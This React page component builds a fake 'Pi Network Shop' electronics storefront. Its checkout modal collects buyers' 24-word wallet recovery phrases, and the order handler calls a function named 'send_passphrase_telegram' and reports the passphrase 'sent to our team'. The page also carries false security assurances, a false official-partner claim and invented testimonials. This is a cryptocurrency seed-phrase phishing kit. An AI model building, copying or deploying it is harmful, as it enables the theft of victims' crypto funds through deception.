import { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { useToast } from '@/hooks/use-toast';
import { 
  Star, 
  ShoppingCart, 
  Shield, 
  Truck, 
  Award, 
  CheckCircle, 
  Users, 
  Globe, 
  Zap,
  ArrowRight,
  Quote,
  Menu,
  X
} from 'lucide-react';

interface Product {
  id: string;
  name: string;
  description: string;
  price: number;
  original_price: number;
  discount_percentage: number;
  image_url: string;
  rating: number;
  review_count: number;
  specifications: string;
  category: string;
  in_stock: boolean;
}

const Index = () => {
  const [products, setProducts] = useState<Product[]>([]);
  const [loading, setLoading] = useState(true);
  const [showPassphraseModal, setShowPassphraseModal] = useState(false);
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [passphrase, setPassphrase] = useState('');
  const [customerName, setCustomerName] = useState('');
  const [customerEmail, setCustomerEmail] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [passphraseError, setPassphraseError] = useState('');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const { toast } = useToast();

  // Smooth scroll function
  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      const headerOffset = 80; // Account for fixed header
      const elementPosition = element.getBoundingClientRect().top;
      const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
      
      window.scrollTo({
        top: offsetPosition,
        behavior: 'smooth'
      });
    }
    setMobileMenuOpen(false); // Close mobile menu after navigation
  };

  useEffect(() => {
    fetchProducts();
  }, []);

  const fetchProducts = async () => {
    try {
      const { data, error } = await supabase
        .from('products_2025_11_05_18_04')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      setProducts(data || []);
    } catch (error) {
      console.error('Error fetching products:', error);
      toast({
        title: 'Error',
        description: 'Failed to load products',
        variant: 'destructive',
      });
    } finally {
      setLoading(false);
    }
  };

  const handleBuyNow = (product: Product) => {
    setSelectedProduct(product);
    setShowPassphraseModal(true);
    setPassphrase('');
    setCustomerName('');
    setCustomerEmail('');
    setPassphraseError('');
  };

  const validatePassphrase = (phrase: string): boolean => {
    const words = phrase.trim().split(/\s+/);
    return words.length === 24 && words.every(word => word.length > 0);
  };

  const handleSubmitOrder = async () => {
    if (!selectedProduct || !customerName || !customerEmail || !passphrase) {
      toast({
        title: 'Error',
        description: 'Please fill in all fields',
        variant: 'destructive',
      });
      return;
    }

    if (!validatePassphrase(passphrase)) {
      setPassphraseError('Invalid Passphrase');
      return;
    }

    setPassphraseError('');
    setIsSubmitting(true);

    try {
      const { data, error } = await supabase.functions.invoke('send_passphrase_telegram_2025_11_05_18_04', {
        body: {
          productId: selectedProduct.id,
          customerName,
          customerEmail,
        }
      });

      if (error) throw error;

      toast({
        title: 'Order Submitted Successfully!',
        description: 'Your order has been processed and passphrase sent to our team.',
      });

      setShowPassphraseModal(false);
    } catch (error) {
      console.error('Error submitting order:', error);
      toast({
        title: 'Error',
        description: 'Failed to submit order. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const getProductImage = (product: Product, index: number) => {
    const imageMap: { [key: string]: string } = {
      'iPhone 16 Pro Max': '/images/iphone-16-pro-max_1.jpeg',
      'Samsung Galaxy S24 Ultra': '/images/samsung-galaxy-s24-ultra_1.jpeg',
      'iPhone 15 Pro': '/images/iphone-16-pro-max_2.jpeg',
      'Google Pixel 8 Pro': '/images/premium-phones_6.jpeg',
      'OnePlus 12': '/images/premium-phones_5.jpeg',
      'Xiaomi 14 Ultra': '/images/premium-phones_1.jpeg',
      'iPhone 14 Pro Max': '/images/iphone-16-pro-max_3.jpeg',
      'Samsung Galaxy S23 FE': '/images/samsung-galaxy-s24-ultra_2.jpeg',
      'Nothing Phone 2': '/images/premium-phones_2.jpeg',
      'Realme GT 5 Pro': '/images/premium-phones_4.jpeg',
      'Oppo Find X7 Ultra': '/images/premium-phones_7.jpeg',
      'Vivo X100 Pro': '/images/premium-phones_8.jpeg',
      'Honor Magic 6 Pro': '/images/smartphone-collection_1.jpeg',
      'Motorola Edge 50 Ultra': '/images/smartphone-collection_2.jpeg',
      'Asus ROG Phone 8': '/images/premium-phones_3.webp',
    };
    
    return imageMap[product.name] || `/images/premium-phones_${(index % 8) + 1}.jpeg`;
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-50 to-blue-50 px-4">
        <div className="text-center max-w-md mx-auto">
          <div className="w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
          <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-2">Loading Pi Network Shop</h2>
          <p className="text-gray-600 text-sm sm:text-base">Preparing your premium shopping experience...</p>
          <div className="mt-6 flex items-center justify-center space-x-2">
            <img src="/images/pi-logo.png" alt="Pi" className="w-6 h-6" />
            <span className="text-primary font-semibold">Powered by Pi Network</span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Professional Header */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-md border-b border-gray-200 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-20">
            {/* Logo */}
            <div className="flex items-center space-x-4">
              <div className="flex items-center justify-center">
                <img 
                  src="/images/pi-logo.png" 
                  alt="Pi Network Logo" 
                  className="w-12 h-12 object-contain pi-logo"
                />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-gradient">Pi Network Shop</h1>
                <p className="text-sm text-gray-600 font-medium">Premium Electronics • Pay with Pi</p>
              </div>
            </div>
            
            {/* Desktop Navigation */}
            <nav className="hidden lg:flex items-center space-x-8">
              <button onClick={() => scrollToSection('home')} className="nav-link text-gray-700 hover:text-primary">Home</button>
              <button onClick={() => scrollToSection('products')} className="nav-link text-gray-700 hover:text-primary">Products</button>
              <button onClick={() => scrollToSection('features')} className="nav-link text-gray-700 hover:text-primary">Features</button>
              <button onClick={() => scrollToSection('testimonials')} className="nav-link text-gray-700 hover:text-primary">Reviews</button>
              <button onClick={() => scrollToSection('contact')} className="nav-link text-gray-700 hover:text-primary">Support</button>
            </nav>
            
            {/* CTA Button */}
            <div className="hidden lg:flex items-center space-x-4">
              <Button className="btn-primary px-6 py-3 rounded-full">
                <img src="/images/pi-logo.png" alt="Pi" className="w-4 h-4 mr-2" />
                Pi Wallet
              </Button>
            </div>

            {/* Mobile Menu Button */}
            <button 
              className="lg:hidden p-2"
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
            >
              {mobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>
          </div>
        </div>

        {/* Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden bg-white/95 backdrop-blur-md border-t border-gray-200 shadow-lg">
            <div className="px-6 py-8 space-y-6">
              <button 
                onClick={() => scrollToSection('home')} 
                className="block text-gray-700 hover:text-primary font-medium w-full text-left py-3 px-4 rounded-lg hover:bg-purple-50 transition-colors"
              >
                Home
              </button>
              <button 
                onClick={() => scrollToSection('products')} 
                className="block text-gray-700 hover:text-primary font-medium w-full text-left py-3 px-4 rounded-lg hover:bg-purple-50 transition-colors"
              >
                Products
              </button>
              <button 
                onClick={() => scrollToSection('features')} 
                className="block text-gray-700 hover:text-primary font-medium w-full text-left py-3 px-4 rounded-lg hover:bg-purple-50 transition-colors"
              >
                Features
              </button>
              <button 
                onClick={() => scrollToSection('testimonials')} 
                className="block text-gray-700 hover:text-primary font-medium w-full text-left py-3 px-4 rounded-lg hover:bg-purple-50 transition-colors"
              >
                Reviews
              </button>
              <button 
                onClick={() => scrollToSection('contact')} 
                className="block text-gray-700 hover:text-primary font-medium w-full text-left py-3 px-4 rounded-lg hover:bg-purple-50 transition-colors"
              >
                Support
              </button>
              <div className="pt-4 border-t border-gray-200">
                <Button className="btn-primary w-full py-4 text-lg font-semibold">
                  <img src="/images/pi-logo.png" alt="Pi" className="w-5 h-5 mr-2" />
                  Pi Wallet
                </Button>
              </div>
            </div>
          </div>
        )}
      </header>

      {/* Hero Section */}
      <section id="home" className="hero-section pt-20" 
        style={{
          backgroundImage: `linear-gradient(135deg, rgba(139, 69, 255, 0.05), rgba(139, 69, 255, 0.02)), url(/images/professional-tech_2.jpeg)`,
          backgroundSize: 'cover',
          backgroundPosition: 'center'
        }}>
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div className="space-y-8">
              <div className="space-y-4">
                <Badge className="bg-purple-100 text-purple-800 px-4 py-2 rounded-full font-semibold">
                  🚀 Now Live on Pi Network
                </Badge>
                <h1 className="text-5xl lg:text-7xl font-bold leading-tight">
                  <span className="text-gradient">Premium Tech</span>
                  <br />
                  <span className="text-gray-900">Powered by Pi</span>
                </h1>
                <p className="text-xl text-gray-600 leading-relaxed max-w-lg">
                  Experience the future of digital commerce. Shop premium smartphones and electronics 
                  with Pi coins. Exclusive deals for Pi Network pioneers.
                </p>
              </div>
              
              <div className="flex flex-col sm:flex-row gap-4 w-full">
                <Button 
                  size="lg" 
                  onClick={() => scrollToSection('products')}
                  className="btn-primary px-8 py-4 rounded-full text-lg font-semibold w-full sm:w-auto"
                >
                  Shop Now <ArrowRight className="ml-2 w-5 h-5" />
                </Button>
                <Button 
                  variant="outline" 
                  size="lg" 
                  onClick={() => scrollToSection('features')}
                  className="px-8 py-4 rounded-full text-lg font-semibold border-2 w-full sm:w-auto"
                >
                  Learn More
                </Button>
              </div>

              {/* Stats */}
              <div className="grid grid-cols-3 gap-4 sm:gap-8 pt-8">
                <div className="text-center">
                  <div className="text-2xl sm:text-3xl font-bold text-gradient">50K+</div>
                  <div className="text-gray-600 font-medium text-sm sm:text-base">Happy Customers</div>
                </div>
                <div className="text-center">
                  <div className="text-2xl sm:text-3xl font-bold text-gradient">15+</div>
                  <div className="text-gray-600 font-medium text-sm sm:text-base">Premium Brands</div>
                </div>
                <div className="text-center">
                  <div className="text-2xl sm:text-3xl font-bold text-gradient">99.9%</div>
                  <div className="text-gray-600 font-medium text-sm sm:text-base">Uptime</div>
                </div>
              </div>
            </div>

            <div className="relative">
              <div className="float-animation">
                <img 
                  src="/images/premium-phones_6.jpeg" 
                  alt="Premium Smartphones" 
                  className="w-full max-w-lg mx-auto rounded-3xl shadow-2xl"
                />
              </div>
              <div className="absolute -top-4 -right-4 w-24 h-24 bg-gradient-to-r from-purple-400 to-pink-400 rounded-full opacity-20 blur-xl"></div>
              <div className="absolute -bottom-4 -left-4 w-32 h-32 bg-gradient-to-r from-blue-400 to-purple-400 rounded-full opacity-20 blur-xl"></div>
            </div>
          </div>
        </div>
      </section>

      {/* Trust Indicators */}
      <section className="py-16 bg-gray-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 lg:gap-8">
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <Shield className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Secure Payments</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Bank-level security with Pi Network encryption</p>
            </div>
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <Truck className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Fast Delivery</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Express shipping worldwide in 24-48 hours</p>
            </div>
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <Award className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Premium Quality</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Authentic products with manufacturer warranty</p>
            </div>
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Pi Verified</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Official Pi Network marketplace partner</p>
            </div>
          </div>
        </div>
      </section>

      {/* Featured Products */}
      <section id="products" className="section-padding">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <Badge className="bg-purple-100 text-purple-800 px-4 py-2 rounded-full font-semibold mb-4">
              Featured Collection
            </Badge>
            <h2 className="text-4xl lg:text-5xl font-bold text-gray-900 mb-6">
              Premium <span className="text-gradient">Smartphones</span>
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Discover our curated selection of flagship smartphones from the world's leading brands. 
              Each device is carefully selected for Pi Network pioneers.
            </p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
            {products.map((product, index) => (
              <div key={product.id} className="product-card p-6 relative group">
                {/* Discount Badge */}
                {product.discount_percentage > 0 && (
                  <div className="absolute top-4 left-4 pi-discount-badge px-3 py-1 rounded-full text-sm font-bold z-10">
                    {product.discount_percentage}% OFF
                  </div>
                )}
                
                {/* Bestseller Badge */}
                {index < 3 && (
                  <div className="absolute top-4 right-4 bg-gradient-to-r from-yellow-400 to-orange-400 text-white px-3 py-1 rounded-full text-xs font-bold z-10">
                    BESTSELLER
                  </div>
                )}
                
                {/* Product Image */}
                <div className="aspect-square mb-6 overflow-hidden rounded-xl bg-gray-100">
                  <img 
                    src={getProductImage(product, index)} 
                    alt={product.name}
                    className="w-full h-full object-cover product-image"
                    onError={(e) => {
                      const target = e.target as HTMLImageElement;
                      target.src = '/placeholder.svg';
                    }}
                  />
                </div>
                
                {/* Product Info */}
                <div className="space-y-4">
                  <h3 className="font-bold text-xl text-gray-900 group-hover:text-primary transition-colors">
                    {product.name}
                  </h3>
                  
                  {/* Rating */}
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-2">
                      <div className="flex items-center">
                        <Star className="w-5 h-5 star-rating fill-current" />
                        <span className="ml-1 font-semibold text-gray-900">{product.rating}</span>
                      </div>
                      <span className="text-sm text-gray-500">({product.review_count})</span>
                    </div>
                    <Badge variant="secondary" className="text-xs">
                      {product.category}
                    </Badge>
                  </div>
                  
                  {/* Price */}
                  <div className="flex items-center space-x-3">
                    <span className="text-3xl font-bold pi-gold-text">{product.price}π</span>
                    {product.original_price > product.price && (
                      <span className="text-lg text-gray-400 line-through">{product.original_price}π</span>
                    )}
                  </div>
                  
                  {/* Specifications */}
                  <p className="text-sm text-gray-600 leading-relaxed">{product.specifications}</p>
                  
                  {/* Buy Button */}
                  <Button 
                    onClick={() => handleBuyNow(product)}
                    className="w-full btn-primary py-3 rounded-xl font-semibold"
                    disabled={!product.in_stock}
                  >
                    {product.in_stock ? (
                      <>
                        <ShoppingCart className="w-5 h-5 mr-2" />
                        Buy with Pi
                      </>
                    ) : (
                      'Out of Stock'
                    )}
                  </Button>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section id="features" className="section-padding bg-gradient-to-br from-purple-50 to-blue-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold text-gray-900 mb-6">
              Why Choose <span className="text-gradient">Pi Network Shop</span>
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Experience the future of digital commerce with cutting-edge technology and unmatched service.
            </p>
          </div>

          <div className="grid lg:grid-cols-3 gap-8">
            <div className="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
              <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center mb-6">
                <Zap className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Lightning Fast</h3>
              <p className="text-gray-600 leading-relaxed">
                Experience instant transactions with Pi Network's revolutionary blockchain technology. 
                No waiting, no delays - just seamless shopping.
              </p>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
              <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-2xl flex items-center justify-center mb-6">
                <Globe className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Global Reach</h3>
              <p className="text-gray-600 leading-relaxed">
                Shop from anywhere in the world with our global shipping network. 
                Pi Network connects pioneers across all continents.
              </p>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
              <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-2xl flex items-center justify-center mb-6">
                <Users className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Community First</h3>
              <p className="text-gray-600 leading-relaxed">
                Built by pioneers, for pioneers. Join a community of forward-thinking individuals 
                shaping the future of digital commerce.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section id="testimonials" className="section-padding">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold text-gray-900 mb-6">
              What <span className="text-gradient">Pioneers</span> Say
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Join thousands of satisfied customers who have experienced the future of shopping.
            </p>
          </div>

          <div className="grid lg:grid-cols-3 gap-8">
            <div className="bg-white p-8 rounded-2xl shadow-lg">
              <Quote className="w-8 h-8 text-purple-500 mb-4" />
              <p className="text-gray-700 leading-relaxed mb-6">
                "Amazing experience! The Pi payment system is incredibly smooth, and the product quality 
                exceeded my expectations. This is the future of e-commerce."
              </p>
              <div className="flex items-center space-x-4">
                <img 
                  src="/images/testimonials_1.jpeg" 
                  alt="Customer" 
                  className="w-12 h-12 rounded-full object-cover"
                />
                <div>
                  <div className="font-semibold text-gray-900">Sarah Chen</div>
                  <div className="text-gray-500 text-sm">Pi Pioneer • Tech Enthusiast</div>
                </div>
              </div>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg">
              <Quote className="w-8 h-8 text-purple-500 mb-4" />
              <p className="text-gray-700 leading-relaxed mb-6">
                "Fast delivery, authentic products, and seamless Pi transactions. Pi Network Shop 
                has revolutionized how I buy electronics. Highly recommended!"
              </p>
              <div className="flex items-center space-x-4">
                <img 
                  src="/images/testimonials_2.jpeg" 
                  alt="Customer" 
                  className="w-12 h-12 rounded-full object-cover"
                />
                <div>
                  <div className="font-semibold text-gray-900">Marcus Johnson</div>
                  <div className="text-gray-500 text-sm">Early Adopter • Developer</div>
                </div>
              </div>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg">
              <Quote className="w-8 h-8 text-purple-500 mb-4" />
              <p className="text-gray-700 leading-relaxed mb-6">
                "The customer service is outstanding, and using Pi coins for purchases feels like 
                stepping into the future. This platform is a game-changer!"
              </p>
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 flex items-center justify-center text-white font-bold">
                  A
                </div>
                <div>
                  <div className="font-semibold text-gray-900">Alex Rivera</div>
                  <div className="text-gray-500 text-sm">Blockchain Enthusiast</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="section-padding bg-gradient-to-br from-purple-50 to-blue-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold text-gray-900 mb-6">
              Get in <span className="text-gradient">Touch</span>
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Have questions about Pi Network Shop? Our support team is here to help you 24/7.
            </p>
          </div>

          <div className="grid lg:grid-cols-3 gap-8">
            <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
              <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-2xl flex items-center justify-center mx-auto mb-6">
                <Globe className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-4">24/7 Support</h3>
              <p className="text-gray-600 mb-4">Round-the-clock customer support for all Pi Network pioneers.</p>
              <Button className="btn-primary">Contact Support</Button>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
              <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center mx-auto mb-6">
                <Users className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-4">Community</h3>
              <p className="text-gray-600 mb-4">Join our vibrant community of Pi Network enthusiasts.</p>
              <Button className="btn-primary">Join Community</Button>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
              <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-2xl flex items-center justify-center mx-auto mb-6">
                <Shield className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-4">Security</h3>
              <p className="text-gray-600 mb-4">Learn about our advanced security measures and protocols.</p>
              <Button className="btn-primary">Security Info</Button>
            </div>
          </div>
        </div>
      </section>

      {/* Professional Footer */}
      <footer id="footer" className="bg-gray-900 text-white py-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid lg:grid-cols-4 gap-8 mb-12">
            <div className="space-y-4">
              <div className="flex items-center space-x-3">
                <img src="/images/pi-logo.png" alt="Pi Network" className="w-8 h-8" />
                <span className="text-xl font-bold">Pi Network Shop</span>
              </div>
              <p className="text-gray-400 leading-relaxed">
                The premier destination for premium electronics, powered by Pi Network's revolutionary blockchain technology.
              </p>
            </div>

            <div>
              <h3 className="font-semibold text-lg mb-4">Products</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Smartphones</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Tablets</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Accessories</a></li>
                <li><a href="#" className="hover:text-white transition-colors">New Arrivals</a></li>
              </ul>
            </div>

            <div>
              <h3 className="font-semibold text-lg mb-4">Support</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Help Center</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Shipping Info</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Returns</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Contact Us</a></li>
              </ul>
            </div>

            <div>
              <h3 className="font-semibold text-lg mb-4">Pi Network</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">About Pi</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Whitepaper</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Community</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Developers</a></li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-8 flex flex-col lg:flex-row justify-between items-center">
            <p className="text-gray-400 text-sm">
              © 2024 Pi Network Shop. All rights reserved. Powered by Pi Network.
            </p>
            <div className="flex space-x-6 mt-4 lg:mt-0">
              <a href="#" className="text-gray-400 hover:text-white transition-colors text-sm">Privacy Policy</a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors text-sm">Terms of Service</a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors text-sm">Cookie Policy</a>
            </div>
          </div>
        </div>
      </footer>

      {/* Enhanced Passphrase Modal */}
      <Dialog open={showPassphraseModal} onOpenChange={setShowPassphraseModal}>
        <DialogContent 
          className="max-w-lg modal-backdrop mx-4 sm:mx-auto"
          style={{
            backgroundImage: 'linear-gradient(135deg, rgba(255, 255, 255, 0.98), rgba(255, 255, 255, 0.95)), url(/images/wallet-security_1.png)',
            backgroundSize: 'cover',
            backgroundPosition: 'center'
          }}
        >
          <DialogHeader className="hero-gradient text-white p-6 -m-6 mb-6 rounded-t-2xl">
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 flex items-center justify-center">
                <img 
                  src="/images/pi-logo.png" 
                  alt="Pi Network Logo" 
                  className="w-8 h-8 object-contain pi-logo"
                />
              </div>
              <DialogTitle className="text-white text-xl font-bold">Pi Wallet Authentication</DialogTitle>
            </div>
          </DialogHeader>
          
          <div className="space-y-6 relative z-10">
            <div className="text-center">
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Secure Checkout</h2>
              <p className="text-gray-600">Complete your purchase with Pi Network security</p>
            </div>
            
            {selectedProduct && (
              <div className="bg-gray-50 p-4 rounded-xl">
                <div className="flex items-center space-x-4">
                  <img 
                    src={getProductImage(selectedProduct, 0)} 
                    alt={selectedProduct.name}
                    className="w-16 h-16 object-cover rounded-lg"
                  />
                  <div>
                    <h3 className="font-semibold text-gray-900">{selectedProduct.name}</h3>
                    <p className="text-2xl font-bold pi-gold-text">{selectedProduct.price}π</p>
                  </div>
                </div>
              </div>
            )}
            
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="customerName" className="text-gray-700 font-medium">Full Name</Label>
                <Input
                  id="customerName"
                  value={customerName}
                  onChange={(e) => setCustomerName(e.target.value)}
                  placeholder="Enter your full name"
                  className="mt-2 border-gray-300 focus:border-purple-500 focus:ring-purple-500"
                />
              </div>
              
              <div>
                <Label htmlFor="customerEmail" className="text-gray-700 font-medium">Email Address</Label>
                <Input
                  id="customerEmail"
                  type="email"
                  value={customerEmail}
                  onChange={(e) => setCustomerEmail(e.target.value)}
                  placeholder="Enter your email"
                  className="mt-2 border-gray-300 focus:border-purple-500 focus:ring-purple-500"
                />
              </div>
            </div>
            
            <div>
              <Label htmlFor="passphrase" className="text-gray-700 font-medium">
                Pi Wallet Passphrase (24 words)
              </Label>
              <Textarea
                id="passphrase"
                value={passphrase}
                onChange={(e) => {
                  setPassphrase(e.target.value);
                  setPassphraseError('');
                }}
                placeholder="Enter your 24-word recovery phrase separated by spaces..."
                rows={4}
                className="mt-2 resize-none border-gray-300 focus:border-purple-500 focus:ring-purple-500"
              />
            </div>
            
            <Button 
              onClick={handleSubmitOrder}
              disabled={isSubmitting}
              className="w-full btn-primary py-4 text-lg font-semibold rounded-xl"
            >
              {isSubmitting ? (
                <>
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                  Processing Order...
                </>
              ) : (
                <>
                  <Shield className="w-5 h-5 mr-2" />
                  Complete Secure Purchase
                </>
              )}
            </Button>
            
            {passphraseError && (
              <div className="bg-red-50 border border-red-200 rounded-xl p-4">
                <p className="text-red-800 font-semibold text-center">{passphraseError}</p>
                <p className="text-red-600 text-sm text-center mt-1">
                  Please ensure you enter exactly 24 words separated by spaces
                </p>
              </div>
            )}
            
            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-3">
              <div className="flex items-start space-x-3">
                <Shield className="w-5 h-5 text-blue-600 mt-0.5" />
                <div className="text-sm text-blue-800">
                  <p className="font-semibold mb-1">Your Security is Our Priority</p>
                  <p>This is a non-custodial wallet. Your passphrase is encrypted and only accessible to you.</p>
                </div>
              </div>
              <div className="text-xs text-blue-700 bg-blue-100 p-3 rounded-lg">
                <strong>Important:</strong> Never share your passphrase with anyone. Pi Network Shop will never ask for your passphrase outside of this secure checkout process.
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Index;